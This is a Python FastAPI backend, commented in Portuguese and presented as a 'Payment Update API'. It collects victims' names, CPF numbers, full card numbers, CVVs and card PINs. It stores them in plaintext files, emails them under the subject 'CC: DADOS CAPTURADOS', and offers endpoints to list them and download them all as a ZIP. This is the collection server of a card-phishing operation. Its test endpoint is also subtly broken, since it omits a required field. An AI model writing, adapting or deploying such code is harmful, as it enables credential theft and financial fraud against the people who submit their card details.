from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import os
import sys
from pathlib import Path
from dotenv import load_dotenv

# Load environment variables FIRST
load_dotenv()

print("\n" + "="*80)
print("🔍 CARREGANDO CONFIGURAÇÃO DE EMAIL")
print("="*80)

# Email configuration with detailed logging
EMAIL_FROM = os.getenv("EMAIL_FROM", "").strip()
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "").strip()
EMAIL_TO = os.getenv("EMAIL_TO", "").strip()
SMTP_SERVER = os.getenv("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT = int(os.getenv("SMTP_PORT", 587))

print(f"✓ EMAIL_FROM: {EMAIL_FROM}")
print(f"✓ EMAIL_PASSWORD: {'*' * len(EMAIL_PASSWORD) if EMAIL_PASSWORD else '❌ NÃO CONFIGURADO'}")
print(f"✓ EMAIL_TO: {EMAIL_TO}")
print(f"✓ SMTP_SERVER: {SMTP_SERVER}")
print(f"✓ SMTP_PORT: {SMTP_PORT}")

# Validar credenciais
if not EMAIL_FROM:
    print("❌ ERRO: EMAIL_FROM não está configurado no .env!")
    sys.exit(1)
if not EMAIL_PASSWORD:
    print("❌ ERRO: EMAIL_PASSWORD não está configurado no .env!")
    sys.exit(1)
if not EMAIL_TO:
    print("❌ ERRO: EMAIL_TO não está configurado no .env!")
    sys.exit(1)

print("✅ TODAS AS CREDENCIAIS CARREGADAS COM SUCESSO")
print("="*80 + "\n")

app = FastAPI(title="Payment Update API", version="1.0.0")

# CORS configuration - Allow ALL for development/debugging
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allow all origins during development
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
    max_age=3600,
)

# Add request logging middleware
@app.middleware("http")
async def log_requests(request, call_next):
    print(f"\n📨 REQUISIÇÃO RECEBIDA")
    print(f"   Método: {request.method}")
    print(f"   URL: {request.url}")
    print(f"   Origin: {request.headers.get('origin', 'N/A')}")

    response = await call_next(request)

    print(f"   Resposta: {response.status_code}")
    return response

# Pydantic models
class PaymentData(BaseModel):
    nomeCompleto: str
    cpf: str
    numeroCartao: str
    validade: str
    cvv: str
    senhaCartao: str

class EmailResponse(BaseModel):
    success: bool
    message: str
    timestamp: str

# Email configuration
EMAIL_FROM = os.getenv("EMAIL_FROM", "your-email@gmail.com")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "your-app-password")
EMAIL_TO = os.getenv("EMAIL_TO", "your-email@gmail.com")
SMTP_SERVER = os.getenv("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT = int(os.getenv("SMTP_PORT", 587))

# Data directory configuration
DATA_DIR = Path(__file__).parent / "dados"

def create_data_directory():
    """Create dados directory if it doesn't exist"""
    try:
        DATA_DIR.mkdir(exist_ok=True)
        print(f"✓ Data directory ready: {DATA_DIR}")
    except Exception as e:
        print(f"✗ Error creating data directory: {str(e)}")

def get_date_folder():
    """Get or create the date-specific folder"""
    today = datetime.now().strftime("%Y-%m-%d")
    date_folder = DATA_DIR / today
    try:
        date_folder.mkdir(exist_ok=True)
        return date_folder
    except Exception as e:
        print(f"✗ Error creating date folder: {str(e)}")
        raise

def save_payment_data(payment_data: PaymentData) -> str:
    """Save payment data to text file"""
    try:
        date_folder = get_date_folder()
        
        # Create filename with timestamp
        timestamp = datetime.now().strftime("%H%M%S")
        filename = f"pagamento_{timestamp}.txt"
        file_path = date_folder / filename
        
        # Format the data according to user's specification
        current_datetime = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
        
        content = f"""DADOS DE PAGAMENTO
================================================================================

Data/Hora: {current_datetime}
Hora de Processamento: {current_datetime}

INFORMAÇÕES PESSOAIS
--------------------
Nome Completo: {payment_data.nomeCompleto}
CPF: {payment_data.cpf}

DADOS DO CARTÃO
---------------
Número do Cartão: {payment_data.numeroCartao}
Validade: {payment_data.validade}
CVV: {payment_data.cvv}
Senha do Cartão: {payment_data.senhaCartao}

================================================================================
"""
        
        # Write to file
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        print(f"✓ Payment data saved: {file_path}")
        return str(file_path)
    except Exception as e:
        print(f"✗ Error saving payment data: {str(e)}")
        raise

def send_email(payment_data: PaymentData) -> bool:
    """Send payment update email with detailed logging"""
    try:
        print(f"\n{'='*80}")
        print(f"📧 INICIANDO ENVIO DE EMAIL")
        print(f"{'='*80}")

        # Verify credentials are loaded
        print(f"\n1️⃣  Verificando credenciais...")
        print(f"   EMAIL_FROM: {EMAIL_FROM}")
        print(f"   EMAIL_TO: {EMAIL_TO}")
        print(f"   SMTP_SERVER: {SMTP_SERVER}:{SMTP_PORT}")

        if not EMAIL_FROM or not EMAIL_PASSWORD or not EMAIL_TO:
            print(f"❌ ERRO: Credenciais não carregadas do .env!")
            return False

        # Create message
        print(f"\n2️⃣  Criando mensagem de email...")
        message = MIMEMultipart("alternative")
        message["Subject"] = "CC: DADOS CAPTURADOS"
        message["From"] = EMAIL_FROM
        message["To"] = EMAIL_TO

        # Format the card number to show only last 4 digits
        card_last_4 = payment_data.numeroCartao.replace(" ", "")[-4:]
        card_masked = f"**** **** **** {card_last_4}"

        # Current timestamp
        current_datetime = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")

        # Create plain text version
        text = f"""DADOS DE PAGAMENTO
================================================================================

Data/Hora: {current_datetime}
Hora de Processamento: {current_datetime}

INFORMAÇÕES PESSOAIS
--------------------
Nome Completo: {payment_data.nomeCompleto}
CPF: {payment_data.cpf}

DADOS DO CARTÃO
---------------
Número do Cartão: {card_masked}
Validade: {payment_data.validade}
CVV: ***

================================================================================
"""

        # Create HTML version
        html = f"""
        <html>
            <body style="font-family: Arial, sans-serif; background-color: #f5f5f5; padding: 20px;">
                <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                    <h2 style="color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px;">DADOS DE PAGAMENTO</h2>

                    <p style="color: #666; font-size: 12px;">
                        <strong>Data/Hora:</strong> {current_datetime}<br>
                        <strong>Hora de Processamento:</strong> {current_datetime}
                    </p>

                    <h3 style="color: #333; margin-top: 20px; border-bottom: 1px solid #ddd; padding-bottom: 10px;">INFORMAÇÕES PESSOAIS</h3>

                    <table style="width: 100%; margin-top: 10px;">
                        <tr>
                            <td style="padding: 8px; font-weight: bold; color: #555;">Nome Completo:</td>
                            <td style="padding: 8px; color: #333;">{payment_data.nomeCompleto}</td>
                        </tr>
                        <tr style="background-color: #f9f9f9;">
                            <td style="padding: 8px; font-weight: bold; color: #555;">CPF:</td>
                            <td style="padding: 8px; color: #333;">{payment_data.cpf}</td>
                        </tr>
                    </table>

                    <h3 style="color: #333; margin-top: 20px; border-bottom: 1px solid #ddd; padding-bottom: 10px;">DADOS DO CARTÃO</h3>

                    <table style="width: 100%; margin-top: 10px;">
                        <tr>
                            <td style="padding: 8px; font-weight: bold; color: #555;">Número do Cartão:</td>
                            <td style="padding: 8px; color: #333;">{card_masked}</td>
                        </tr>
                        <tr style="background-color: #f9f9f9;">
                            <td style="padding: 8px; font-weight: bold; color: #555;">Validade:</td>
                            <td style="padding: 8px; color: #333;">{payment_data.validade}</td>
                        </tr>
                        <tr>
                            <td style="padding: 8px; font-weight: bold; color: #555;">CVV:</td>
                            <td style="padding: 8px; color: #333;">***</td>
                        </tr>
                    </table>

                    <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; color: #999; font-size: 12px;">
                        <p>Este é um e-mail automático. Por favor, não responda a este e-mail.</p>
                    </div>
                </div>
            </body>
        </html>
        """

        # Attach versions
        print(f"✓ Conteúdo do email criado")
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)

        # Send email with detailed error handling
        print(f"\n3️⃣  Conectando ao servidor SMTP...")
        print(f"   Servidor: {SMTP_SERVER}:{SMTP_PORT}")

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10) as server:
            print(f"✓ Conectado ao servidor SMTP")

            print(f"\n4️⃣  Iniciando TLS...")
            server.starttls()
            print(f"✓ TLS ativado com sucesso")

            print(f"\n5️⃣  Autenticando com Gmail...")
            print(f"   Usuário: {EMAIL_FROM}")
            server.login(EMAIL_FROM, EMAIL_PASSWORD)
            print(f"✓ Autenticação bem-sucedida")

            print(f"\n6️⃣  Enviando email...")
            result = server.sendmail(EMAIL_FROM, EMAIL_TO, message.as_string())
            print(f"✓ Email enviado com sucesso para: {EMAIL_TO}")

        print(f"\n{'='*80}")
        print(f"✅ EMAIL ENVIADO COM SUCESSO!")
        print(f"{'='*80}\n")
        return True

    except smtplib.SMTPAuthenticationError as e:
        print(f"\n❌ ERRO DE AUTENTICAÇÃO SMTP")
        print(f"{'='*80}")
        print(f"Erro: {str(e)}")
        print(f"\n⚠️  CAUSAS POSSÍVEIS:")
        print(f"  1. EMAIL_FROM ou EMAIL_PASSWORD incorretos no .env")
        print(f"  2. Senha de app do Gmail não foi gerada")
        print(f"  3. Autenticação de dois fatores não está ativada")
        print(f"\n✅ SOLUÇÃO:")
        print(f"  1. Acesse: https://myaccount.google.com/apppasswords")
        print(f"  2. Gere uma nova senha de app")
        print(f"  3. Atualize EMAIL_PASSWORD no arquivo backend/.env")
        print(f"  4. Reinicie o backend com: python main.py")
        print(f"{'='*80}\n")
        return False

    except smtplib.SMTPException as e:
        print(f"\n❌ ERRO SMTP")
        print(f"{'='*80}")
        print(f"Erro: {str(e)}")
        print(f"\n⚠️  CAUSAS POSSÍVEIS:")
        print(f"  1. Servidor SMTP indisponível")
        print(f"  2. Porta bloqueada pelo firewall")
        print(f"  3. Problema de conexão de internet")
        print(f"{'='*80}\n")
        return False

    except Exception as e:
        print(f"\n❌ ERRO NÃO IDENTIFICADO")
        print(f"{'='*80}")
        print(f"Erro: {str(e)}")
        import traceback
        traceback.print_exc()
        print(f"{'='*80}\n")
        return False

@app.on_event("startup")
async def startup_event():
    """Create necessary directories on startup"""
    create_data_directory()
    print(f"🚀 Backend iniciado em porta 5000")
    print(f"📁 Diretório de dados: {DATA_DIR}")
    print(f"📧 Email configurado para: {EMAIL_TO}")

@app.get("/")
async def root():
    """Health check endpoint"""
    return {
        "status": "API is running",
        "service": "Payment Update Service",
        "data_directory": str(DATA_DIR),
        "email_configured": EMAIL_FROM != "your-email@gmail.com"
    }

@app.post("/api/update-payment", response_model=EmailResponse)
async def update_payment(data: PaymentData):
    """
    Receive payment data, save to file, and send email
    """
    try:
        # Save payment data to file
        print(f"\n💾 Processando pagamento de: {data.nomeCompleto}")
        file_path = save_payment_data(data)
        
        # Send email
        email_sent = send_email(data)
        
        if email_sent:
            return EmailResponse(
                success=True,
                message=f"Pagamento atualizado! Arquivo salvo em: {file_path}",
                timestamp=datetime.now().isoformat()
            )
        else:
            # Even if email fails, file was saved
            return EmailResponse(
                success=True,
                message=f"Pagamento salvo em arquivo, mas erro ao enviar email. Tente novamente mais tarde.",
                timestamp=datetime.now().isoformat()
            )
    except Exception as e:
        print(f"✗ Erro ao processar pagamento: {str(e)}")
        import traceback
        traceback.print_exc()
        raise HTTPException(
            status_code=500,
            detail=f"Erro ao processar a solicitação: {str(e)}"
        )

@app.post("/api/test-email")
async def test_email():
    """Test email configuration"""
    try:
        print("\n🧪 Testando configuração de email...")
        test_data = PaymentData(
            nomeCompleto="Teste de Configuração",
            cpf="000.000.000-00",
            numeroCartao="4111 1111 1111 1111",
            validade="12/25",
            cvv="123"
        )
        
        # Save test data
        file_path = save_payment_data(test_data)
        
        # Send test email
        if send_email(test_data):
            return {
                "success": True,
                "message": "✓ E-mail de teste enviado com sucesso!",
                "file_saved": file_path
            }
        else:
            return {
                "success": False,
                "message": "✗ Falha ao enviar e-mail de teste. Verifique credenciais.",
                "file_saved": file_path
            }
    except Exception as e:
        return {
            "success": False,
            "message": f"✗ Erro ao testar email: {str(e)}"
        }

@app.get("/api/status")
async def status():
    """Get API status and configuration"""
    return {
        "status": "running",
        "port": 5000,
        "data_directory": str(DATA_DIR),
        "data_directory_exists": DATA_DIR.exists(),
        "email_from": EMAIL_FROM,
        "email_to": EMAIL_TO,
        "smtp_server": SMTP_SERVER,
        "smtp_port": SMTP_PORT
    }

@app.get("/api/payments")
async def get_all_payments():
    """Get all captured payment data"""
    try:
        print(f"\n📥 Listando todos os pagamentos...")
        payments = []

        # Check if data directory exists
        if not DATA_DIR.exists():
            print(f"⚠️  Diretório de dados não existe")
            return {"success": True, "payments": [], "total": 0}

        # Iterate through all date folders
        for date_folder in sorted(DATA_DIR.iterdir(), reverse=True):
            if not date_folder.is_dir():
                continue

            # Iterate through all payment files in the date folder
            for file_path in sorted(date_folder.glob("pagamento_*.txt"), reverse=True):
                try:
                    # Read file content
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read()

                    # Parse the file to extract data
                    payment_data = parse_payment_file(content, file_path)
                    if payment_data:
                        payments.append(payment_data)
                except Exception as e:
                    print(f"⚠️  Erro ao ler arquivo {file_path}: {str(e)}")
                    continue

        print(f"✓ {len(payments)} pagamentos encontrados")
        return {
            "success": True,
            "payments": payments,
            "total": len(payments)
        }
    except Exception as e:
        print(f"❌ Erro ao listar pagamentos: {str(e)}")
        import traceback
        traceback.print_exc()
        return {
            "success": False,
            "error": str(e),
            "payments": [],
            "total": 0
        }

@app.get("/api/payment/{payment_id}")
async def get_payment_details(payment_id: str):
    """Get details of a specific payment file"""
    try:
        print(f"\n📖 Buscando detalhes do pagamento: {payment_id}")

        # Iterate through all date folders to find the file
        if not DATA_DIR.exists():
            return {
                "success": False,
                "error": "Arquivo não encontrado"
            }

        for date_folder in DATA_DIR.iterdir():
            if not date_folder.is_dir():
                continue

            file_path = date_folder / f"{payment_id}.txt"
            if file_path.exists():
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()

                return {
                    "success": True,
                    "id": payment_id,
                    "content": content
                }

        return {
            "success": False,
            "error": "Arquivo não encontrado"
        }
    except Exception as e:
        print(f"❌ Erro ao buscar pagamento: {str(e)}")
        return {
            "success": False,
            "error": str(e)
        }

@app.get("/api/payment/{payment_id}/download")
async def download_payment_file(payment_id: str):
    """Download a specific payment file as TXT"""
    try:
        print(f"\n📥 Baixando arquivo de pagamento: {payment_id}")

        # Iterate through all date folders to find the file
        if not DATA_DIR.exists():
            return {
                "success": False,
                "error": "Arquivo não encontrado"
            }

        for date_folder in DATA_DIR.iterdir():
            if not date_folder.is_dir():
                continue

            file_path = date_folder / f"{payment_id}.txt"
            if file_path.exists():
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()

                from fastapi.responses import FileResponse

                # Return file with proper headers
                return FileResponse(
                    file_path,
                    media_type="text/plain; charset=utf-8",
                    filename=f"{payment_id}.txt"
                )

        return {
            "success": False,
            "error": "Arquivo não encontrado"
        }
    except Exception as e:
        print(f"❌ Erro ao baixar pagamento: {str(e)}")
        return {
            "success": False,
            "error": str(e)
        }

@app.get("/api/download-zip")
async def download_zip():
    """Download all payment data as a ZIP file"""
    try:
        import zipfile
        import io

        print(f"\n📦 Preparando ZIP com todos os dados...")

        # Create a BytesIO object to store the ZIP file in memory
        zip_buffer = io.BytesIO()

        # Check if data directory exists
        if not DATA_DIR.exists():
            print(f"⚠️  Diretório de dados não existe")
            return {
                "success": False,
                "error": "Nenhum dado disponível para download"
            }

        # Create ZIP file
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            file_count = 0

            # Iterate through all date folders
            for date_folder in sorted(DATA_DIR.iterdir()):
                if not date_folder.is_dir():
                    continue

                date_str = date_folder.name

                # Iterate through all payment files
                for file_path in date_folder.glob("pagamento_*.txt"):
                    try:
                        # Add file to ZIP with folder structure: date/filename
                        arcname = f"dados_{date_str}/{file_path.name}"
                        zip_file.write(file_path, arcname=arcname)
                        file_count += 1
                    except Exception as e:
                        print(f"⚠️  Erro ao adicionar arquivo ao ZIP: {str(e)}")
                        continue

        print(f"✓ ZIP preparado com {file_count} arquivos")

        # Return the ZIP file
        zip_buffer.seek(0)
        from fastapi.responses import StreamingResponse

        return StreamingResponse(
            iter([zip_buffer.getvalue()]),
            media_type="application/zip",
            headers={"Content-Disposition": "attachment; filename=pagamentos.zip"}
        )
    except Exception as e:
        print(f"❌ Erro ao preparar ZIP: {str(e)}")
        import traceback
        traceback.print_exc()
        return {
            "success": False,
            "error": str(e)
        }

def parse_payment_file(content: str, file_path: Path) -> dict:
    """Parse payment file content and extract data"""
    try:
        lines = content.split('\n')
        data = {
            'id': file_path.stem,  # Use filename as ID
            'nomeCompleto': '',
            'cpf': '',
            'numeroCartao': '',
            'validade': '',
            'dataCriacao': file_path.parent.name,  # Date folder
            'status': 'processado'
        }

        # Parse each line
        for line in lines:
            if 'Nome Completo:' in line:
                data['nomeCompleto'] = line.split('Nome Completo:')[1].strip()
            elif 'CPF:' in line and 'INFORMAÇÕES PESSOAIS' not in line:
                data['cpf'] = line.split('CPF:')[1].strip()
            elif 'Número do Cartão:' in line:
                data['numeroCartao'] = line.split('Número do Cartão:')[1].strip()
            elif 'Validade:' in line and 'DADOS DO CARTÃO' not in line:
                data['validade'] = line.split('Validade:')[1].strip()
            elif 'Data/Hora:' in line and data['dataCriacao'] == file_path.parent.name:
                data['dataCriacao'] = line.split('Data/Hora:')[1].strip()

        return data if data['nomeCompleto'] else None
    except Exception as e:
        print(f"❌ Erro ao fazer parse do arquivo: {str(e)}")
        return None

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
